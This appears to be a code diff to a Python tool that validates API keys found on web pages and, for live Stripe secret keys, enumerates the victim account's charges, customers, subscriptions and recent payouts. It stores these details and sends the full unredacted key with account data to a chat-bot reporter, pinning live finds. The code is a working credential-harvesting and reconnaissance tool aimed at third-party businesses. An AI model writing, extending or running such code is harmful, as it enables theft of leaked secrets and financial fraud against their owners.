@@ -307,7 +307,7 @@ class KeyValidator:
         result = await self.validate_key(key_type, key_value, source_url, extra)
 
         if result.is_live:
-            # Persist
+            # Persist to key_validations table
             if self.db:
                 try:
                     self.db.add_key_validation({
@@ -324,27 +324,78 @@ class KeyValidator:
                 except Exception:
                     pass
 
+            # Persist to stripe_keys table for sk_live keys
+            is_live_sk = (
+                key_type == "stripe_sk"
+                and result.key_full.startswith("sk_live_")
+            )
+            if is_live_sk and self.db:
+                try:
+                    from urllib.parse import urlparse
+                    domain = urlparse(source_url).netloc if source_url else ""
+                    self.db.update_stripe_key_validation(
+                        result.key_full,
+                        {
+                            "is_live": True,
+                            "account_id": result.account_info.get("id", ""),
+                            "account_email": result.account_info.get("email", ""),
+                            "business_name": result.account_info.get("business", ""),
+                            "country": result.account_info.get("country", ""),
+                            "balance_json": json.dumps({
+                                k: v for k, v in result.account_info.items()
+                                if k.startswith("balance_")
+                            }),
+                            "charges_count": result.account_info.get("charges_count", ""),
+                            "customers_count": result.account_info.get("customers_count", ""),
+                            "products_count": result.account_info.get("products_count", ""),
+                            "subscriptions_count": result.account_info.get("subscriptions_count", ""),
+                            "risk_level": result.risk_level,
+                            "permissions": json.dumps(result.permissions),
+                        },
+                    )
+                except Exception:
+                    pass
+
             # Report
             if self.reporter:
                 acct = "\n".join(
                     f"  {k}: <code>{v}</code>" for k, v in result.account_info.items()
                 )
                 perms = ", ".join(result.permissions[:10]) if result.permissions else "unknown"
-                text = (
-                    f"🔑 <b>LIVE API Key Found!</b>\n"
-                    f"Type: <b>{result.key_type}</b>\n"
-                    f"Risk: <b>{result.risk_level}</b>\n"
-                    f"Key: <code>{result.display_key}</code>\n"
-                    f"Confidence: {result.confidence:.0%}\n"
-                    f"Source: <code>{source_url[:80]}</code>\n"
-                )
+
+                if is_live_sk:
+                    # Fire emoji header for live SK keys
+                    text = (
+                        f"🔥🔥🔥 <b>LIVE STRIPE SK FOUND!</b> 🔥🔥🔥\n"
+                        f"Type: <b>{result.key_type}</b>\n"
+                        f"Risk: <b>{result.risk_level}</b>\n"
+                        f"Key: <code>{result.display_key}</code>\n"
+                        f"Full: <code>{result.key_full}</code>\n"
+                        f"Confidence: {result.confidence:.0%}\n"
+                        f"Source: <code>{source_url[:80]}</code>\n"
+                    )
+                else:
+                    text = (
+                        f"🔑 <b>LIVE API Key Found!</b>\n"
+                        f"Type: <b>{result.key_type}</b>\n"
+                        f"Risk: <b>{result.risk_level}</b>\n"
+                        f"Key: <code>{result.display_key}</code>\n"
+                        f"Confidence: {result.confidence:.0%}\n"
+                        f"Source: <code>{source_url[:80]}</code>\n"
+                    )
                 if acct:
                     text += f"\n<b>Account:</b>\n{acct}"
                 if result.permissions:
                     text += f"\nPermissions: {perms}"
 
                 try:
-                    await self.reporter.send_message(text)
+                    msg = await self.reporter.send_message(text)
+                    # Auto-pin live SK findings
+                    if is_live_sk and msg:
+                        try:
+                            await self.reporter.pin_message(msg)
+                        except Exception:
+                            pass
                 except Exception:
                     pass
 
@@ -429,11 +480,56 @@ class KeyValidator:
                     except Exception:
                         pass
 
+                    # Full recon — only for sk_live_ keys (skip test keys)
+                    if result.key_full.startswith("sk_live_"):
+                        await self._stripe_full_recon(session, auth, result)
+
                 elif resp.status == 401:
                     result.is_live = False
                     result.confidence = 1.0
                 else:
                     result.error = f"HTTP {resp.status}"
+
+    async def _stripe_full_recon(self, session, auth, result: 'KeyValidation'):
+        """Extended Stripe recon: charges, customers, products, subscriptions, payouts."""
+        recon_endpoints = [
+            ("charges", "https://api.stripe.com/v1/charges?limit=1"),
+            ("customers", "https://api.stripe.com/v1/customers?limit=1"),
+            ("products", "https://api.stripe.com/v1/products?limit=1"),
+            ("subscriptions", "https://api.stripe.com/v1/subscriptions?limit=1"),
+            ("payouts", "https://api.stripe.com/v1/payouts?limit=3"),
+        ]
+        for name, url in recon_endpoints:
+            try:
+                async with session.get(
+                    url, auth=auth,
+                    timeout=aiohttp.ClientTimeout(total=self.timeout),
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        items = data.get("data", [])
+                        has_more = data.get("has_more", False)
+                        count = len(items)
+                        if has_more:
+                            count_str = f"{count}+"
+                        else:
+                            count_str = str(count)
+                        result.account_info[f"{name}_count"] = count_str
+                        result.permissions.append(f"{name}:read")
+
+                        # Extra detail for payouts
+                        if name == "payouts" and items:
+                            recent = []
+                            for p in items[:3]:
+                                amt = p.get("amount", 0) / 100
+                                cur = p.get("currency", "").upper()
+                                status = p.get("status", "")
+                                recent.append(f"{amt:.2f} {cur} ({status})")
+                            result.account_info["recent_payouts"] = " | ".join(recent)
+                    elif resp.status == 403:
+                        result.account_info[f"{name}_count"] = "restricted"
+            except Exception:
+                pass
 
     async def _validate_stripe_publishable(
         self, result: KeyValidation, extra: Dict
